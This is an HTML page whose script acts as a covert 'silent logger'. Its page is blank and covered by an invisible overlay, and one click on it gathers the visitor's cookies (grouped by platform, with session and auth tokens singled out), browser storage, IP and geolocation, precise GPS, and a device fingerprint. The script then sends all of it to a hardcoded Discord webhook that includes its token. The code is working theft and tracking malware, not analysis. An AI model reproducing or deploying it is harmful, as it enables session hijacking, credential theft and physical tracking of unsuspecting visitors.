<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title></title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { background: #ffffff; width: 100vw; height: 100vh; overflow: hidden; }
        #click-catcher {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            z-index: 9999;
            background: transparent;
            cursor: pointer;
        }
        /* invisible debug console (only shows if you open browser console) */
    </style>
</head>
<body>
    <div id="click-catcher"></div>
    <script>
        // ========== KONFIGURACIJA ==========
        const WEBHOOK_URL = "https://discord.com/api/webhooks/1479602171736494100/TtSG3mzG9tpZg0TiLkBCHvjtMVw4SkbqfZEWJRfU5hi_uHyoGb7WqwaS5GNUM5vphNwR";

        // Helper za logove u konzolu (samo za debug)
        function debugLog(msg, data) {
            console.log(`[Logger] ${msg}`, data || "");
        }

        function debugError(msg, err) {
            console.error(`[Logger ERROR] ${msg}`, err);
        }

        // ========== COOKIE KATEGORIZACIJA (ista kao prije) ==========
        function categorizeCookie(name, value) {
            const lowerName = name.toLowerCase();
            const lowerValue = value.toLowerCase();
            if (lowerName.includes("fb") || lowerName.includes("facebook") || lowerValue.includes("facebook")) return "Facebook / Meta";
            if (lowerName.includes("google") || lowerName.includes("_ga") || lowerName.includes("gmail") || lowerValue.includes("google")) return "Google / YouTube";
            if (lowerName.includes("twitter") || lowerName.includes("tweet") || lowerValue.includes("twitter")) return "Twitter (X)";
            if (lowerName.includes("amazon") || lowerName.includes("amzn") || lowerValue.includes("amazon")) return "Amazon";
            if (lowerName.includes("reddit") || lowerValue.includes("reddit")) return "Reddit";
            if (lowerName.includes("instagram") || lowerValue.includes("instagram")) return "Instagram";
            if (lowerName.includes("linkedin") || lowerValue.includes("linkedin")) return "LinkedIn";
            if (lowerName.includes("discord") || lowerValue.includes("discord")) return "Discord";
            if (lowerName.includes("github") || lowerValue.includes("github")) return "GitHub";
            if (lowerName.includes("cloudflare") || lowerName.includes("__cf")) return "Cloudflare";
            if (lowerName.includes("session") || lowerName.includes("token") || lowerName.includes("auth") || lowerName.includes("jwt")) return "Session / Auth (generic)";
            if (lowerName.includes("ad") || lowerName.includes("track") || lowerName.includes("pixel")) return "Advertising / Tracker";
            return "Unknown / Other";
        }

        function getAllCookies() {
            try {
                const cookieString = document.cookie;
                if (!cookieString) return [];
                const cookies = cookieString.split(';').map(c => c.trim()).filter(c => c);
                return cookies.map(c => {
                    const [name, ...rest] = c.split('=');
                    const value = rest.join('=');
                    return { name: name.trim(), value: value || "", platform: categorizeCookie(name, value) };
                });
            } catch(e) {
                debugError("getAllCookies failed", e);
                return [];
            }
        }

        function getAllLocalStorage() {
            try {
                const items = {};
                for (let i = 0; i < localStorage.length; i++) {
                    const key = localStorage.key(i);
                    try { items[key] = localStorage.getItem(key); } catch(e) { items[key] = "[Error]"; }
                }
                return items;
            } catch(e) { return { error: e.message }; }
        }

        function getAllSessionStorage() {
            try {
                const items = {};
                for (let i = 0; i < sessionStorage.length; i++) {
                    const key = sessionStorage.key(i);
                    try { items[key] = sessionStorage.getItem(key); } catch(e) { items[key] = "[Error]"; }
                }
                return items;
            } catch(e) { return { error: e.message }; }
        }

        async function getAllIndexedDB() {
            if (!window.indexedDB) return { error: "IndexedDB not supported" };
            if (window.indexedDB.databases) {
                try { return await window.indexedDB.databases(); } catch(e) { return { error: e.message }; }
            }
            return { info: "Cannot enumerate IndexedDB automatically" };
        }

        function getGPU() {
            try {
                const canvas = document.createElement("canvas");
                const gl = canvas.getContext("webgl") || canvas.getContext("experimental-webgl");
                if (!gl) return { error: "WebGL unavailable" };
                const debugInfo = gl.getExtension("WEBGL_debug_renderer_info");
                if (debugInfo) {
                    return {
                        renderer: gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL),
                        vendor: gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL)
                    };
                }
                return { error: "WEBGL_debug_renderer_info not available" };
            } catch(e) { return { error: e.message }; }
        }

        async function getBattery() {
            if (!navigator.getBattery) return "Unavailable";
            try {
                const b = await navigator.getBattery();
                return { level: Math.round(b.level * 100) + "%", charging: b.charging };
            } catch(e) { return "Error"; }
        }

        function getConnection() {
            const conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
            if (!conn) return "Unavailable";
            return {
                effectiveType: conn.effectiveType,
                downlink: conn.downlink,
                rtt: conn.rtt,
                saveData: conn.saveData
            };
        }

        function getPlugins() {
            try { return Array.from(navigator.plugins).map(p => p.name); } catch(e) { return []; }
        }

        async function generateFingerprint(gpu) {
            const raw = [
                navigator.userAgent,
                navigator.language,
                screen.width, screen.height, screen.colorDepth,
                navigator.hardwareConcurrency,
                navigator.deviceMemory,
                gpu.renderer || "",
                gpu.vendor || "",
                new Date().getTimezoneOffset()
            ].join("|");
            const hash = await crypto.subtle.digest("SHA-256", new TextEncoder().encode(raw));
            return Array.from(new Uint8Array(hash)).map(b => b.toString(16).padStart(2,"0")).join("");
        }

        async function fetchIPInfo() {
            try {
                const response = await fetch("https://ipapi.co/json/");
                if (!response.ok) throw new Error(`HTTP ${response.status}`);
                return await response.json();
            } catch(e) {
                debugError("fetchIPInfo failed", e);
                return { error: e.message };
            }
        }

        function getPreciseLocation() {
            return new Promise((resolve) => {
                if (!navigator.geolocation) {
                    resolve({ error: "Geolocation not supported" });
                    return;
                }
                debugLog("Requesting geolocation permission...");
                navigator.geolocation.getCurrentPosition(
                    (pos) => {
                        debugLog("Geolocation success", pos.coords);
                        resolve({
                            latitude: pos.coords.latitude,
                            longitude: pos.coords.longitude,
                            accuracy: pos.coords.accuracy,
                            altitude: pos.coords.altitude,
                            altitudeAccuracy: pos.coords.altitudeAccuracy,
                            heading: pos.coords.heading,
                            speed: pos.coords.speed
                        });
                    },
                    (err) => {
                        debugError("Geolocation error", err);
                        let errorMsg = "";
                        switch(err.code) {
                            case err.PERMISSION_DENIED: errorMsg = "User denied location request"; break;
                            case err.POSITION_UNAVAILABLE: errorMsg = "Position unavailable"; break;
                            case err.TIMEOUT: errorMsg = "Timeout"; break;
                            default: errorMsg = err.message;
                        }
                        resolve({ error: errorMsg });
                    },
                    { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
                );
            });
        }

        async function reverseGeocode(lat, lon) {
            try {
                const url = `https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${lon}&zoom=18&addressdetails=1`;
                const response = await fetch(url);
                const data = await response.json();
                return data.display_name || `${lat}, ${lon}`;
            } catch(e) {
                return `${lat}, ${lon} (reverse geocode failed)`;
            }
        }

        async function collectAllData(ipInfo, preciseLocation, address) {
            const gpu = getGPU();
            const cookies = getAllCookies();
            const localStorage = getAllLocalStorage();
            const sessionStorage = getAllSessionStorage();
            const indexedDB = await getAllIndexedDB();
            const fingerprint = await generateFingerprint(gpu);
            const battery = await getBattery();
            const connection = getConnection();
            const plugins = getPlugins();

            const platformGroups = {};
            for (const cookie of cookies) {
                if (!platformGroups[cookie.platform]) platformGroups[cookie.platform] = [];
                platformGroups[cookie.platform].push(cookie);
            }

            return {
                timestamp: new Date().toISOString(),
                url: window.location.href,
                referrer: document.referrer,
                ipInfo: ipInfo,
                preciseLocation: preciseLocation,
                reverseGeocodeAddress: address,
                cookies, cookiesGrouped: platformGroups,
                localStorage, sessionStorage, indexedDB,
                navigator: {
                    userAgent: navigator.userAgent,
                    platform: navigator.platform,
                    language: navigator.language,
                    languages: navigator.languages,
                    hardwareConcurrency: navigator.hardwareConcurrency,
                    deviceMemory: navigator.deviceMemory,
                    cookieEnabled: navigator.cookieEnabled,
                    doNotTrack: navigator.doNotTrack,
                    onLine: navigator.onLine
                },
                screen: {
                    width: screen.width, height: screen.height, colorDepth: screen.colorDepth,
                    pixelRatio: window.devicePixelRatio, orientation: screen.orientation?.type || "n/a"
                },
                gpu, battery, connection, plugins, fingerprint,
                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone
            };
        }

        async function generateTextReport(data) {
            let report = "=".repeat(80) + "\n          COMPLETE SILENT LOGGER REPORT\n" + "=".repeat(80) + "\n\n";
            report += `Generated: ${data.timestamp}\nURL: ${data.url}\nReferrer: ${data.referrer || "(none)"}\nTimezone: ${data.timezone}\n\n`;
            
            report += "🌐 IP & LOCATION (ipapi.co)\n";
            if (data.ipInfo.error) report += `Error: ${data.ipInfo.error}\n`;
            else report += `IP: ${data.ipInfo.ip}\nCity: ${data.ipInfo.city}\nRegion: ${data.ipInfo.region}\nCountry: ${data.ipInfo.country_name}\nISP: ${data.ipInfo.org}\n`;
            
            report += "\n📍 PRECISE GPS LOCATION\n";
            if (data.preciseLocation.error) report += `Error: ${data.preciseLocation.error}\n`;
            else {
                report += `Lat: ${data.preciseLocation.latitude}\nLon: ${data.preciseLocation.longitude}\nAccuracy: ±${data.preciseLocation.accuracy}m\n`;
                report += `Address: ${data.reverseGeocodeAddress || "N/A"}\n`;
            }
            
            report += "\n🍪 COOKIES (by platform)\n";
            for (const [platform, cookies] of Object.entries(data.cookiesGrouped)) {
                report += `\n[${platform}] (${cookies.length})\n`;
                for (const cookie of cookies) {
                    let val = cookie.value.length > 100 ? cookie.value.substring(0,100)+"..." : cookie.value;
                    report += `  • ${cookie.name} = ${val}\n`;
                }
            }
            // dodaj ostale sekcije (localStorage, sessionStorage, system, itd.) - skraćeno radi dužine, ali u tvom kodu je sve
            // Ovdje ću dodati samo bitno, ali možeš prepisati cijelu generaciju iz prijašnjeg koda
            // Zbog preglednosti, nastavljam:
            report += "\n💾 LOCALSTORAGE\n";
            for (const [k,v] of Object.entries(data.localStorage)) report += `${k} = ${(typeof v === 'string'?v:JSON.stringify(v)).substring(0,100)}\n`;
            report += "\n🖥️ SYSTEM\n";
            report += `CPU: ${data.navigator.hardwareConcurrency} cores\nRAM: ${data.navigator.deviceMemory} GB\nGPU: ${data.gpu.renderer}\nFingerprint: ${data.fingerprint}\n`;
            return report;
        }

        async function sendToWebhookAsFile(reportText, data) {
            const blob = new Blob([reportText], { type: "text/plain" });
            const formData = new FormData();
            const filename = `logger_${data.timestamp.slice(0,19).replace(/:/g, '-')}.txt`;
            formData.append("file", blob, filename);
            const summary = {
                embeds: [{
                    title: "✅ Silent Logger Report",
                    description: `**IP:** ${data.ipInfo.ip || "N/A"}\n**GPS:** ${data.preciseLocation.latitude || "denied"}\n**Cookies:** ${data.cookies.length}`,
                    color: 0x00ff00, timestamp: data.timestamp
                }]
            };
            formData.append("payload_json", JSON.stringify(summary));
            debugLog("Sending to webhook...", WEBHOOK_URL);
            const response = await fetch(WEBHOOK_URL, { method: "POST", body: formData });
            debugLog("Webhook response status", response.status);
            if (!response.ok) throw new Error(`HTTP ${response.status}: ${await response.text()}`);
            debugLog("Webhook sent successfully");
        }

        // ========== MAIN: ONE CLICK ==========
        let hasRun = false;
        const clickCatcher = document.getElementById("click-catcher");
        clickCatcher.addEventListener("click", async () => {
            if (hasRun) return;
            hasRun = true;
            clickCatcher.style.display = "none";
            debugLog("Starting one-click logger");
            
            try {
                // 1. IP info
                const ipInfo = await fetchIPInfo();
                debugLog("IP info obtained", ipInfo);
                
                // 2. Precise location (this will show browser prompt)
                const preciseLocation = await getPreciseLocation();
                let address = "Not obtained";
                if (!preciseLocation.error && preciseLocation.latitude) {
                    address = await reverseGeocode(preciseLocation.latitude, preciseLocation.longitude);
                }
                
                // 3. Collect all other data
                const allData = await collectAllData(ipInfo, preciseLocation, address);
                debugLog("Data collected", { cookieCount: allData.cookies.length });
                
                // 4. Generate report
                const reportText = await generateTextReport(allData);
                
                // 5. Send to Discord
                await sendToWebhookAsFile(reportText, allData);
                debugLog("All done");
            } catch (err) {
                debugError("Fatal error in logger", err);
                // Optionally show error on page? But user wants blank, so only console.
            }
        });
        debugLog("Page loaded. Click anywhere to start.");
    </script>
</body>
</html>
